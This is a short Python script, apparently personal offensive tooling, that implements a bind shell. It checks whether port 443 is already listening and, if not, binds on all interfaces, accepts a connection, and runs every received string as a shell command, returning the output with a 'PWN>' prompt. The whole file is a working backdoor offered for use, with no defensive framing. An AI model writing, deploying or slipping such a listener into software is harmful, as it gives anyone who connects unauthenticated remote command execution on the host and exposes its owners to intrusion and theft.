#Python Bind shell. Code taken from several projects and modified to work as needed
#Michael L. Check if shell is listening and if not spawn it on define port.
import os
import socket
import subprocess
import sys
#is the shell listening/
a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
location = ("127.0.0.1", 443)
result_of_check = a_socket.connect_ex(location)
a_socket.close()
if result_of_check == 0:
   print("Port is open")
   sys.exit()
else:
   #Execute bind shell
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.bind(('0.0.0.0', 443))
    c.listen(1)
    s,a = c.accept()
    while True:
        data = s.recv(1024)
        if data.decode() == "quit": break
        elif data.decode()[:2] == "cd":
            try: os.chdir(data.decode()[3:])
            except: pass
        else:
            proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdoutput = proc.stdout.read() + proc.stderr.read()
            stdoutput.decode()
            s.sendall(stdoutput)
        s.sendall('PWN>'.encode())
# Loop ends here <-- with these enable the code auto quits need to figure why my if else nesting not fully working. Not needed but good practice.
    #s.send('Bye!'.encode())
    #s.close()
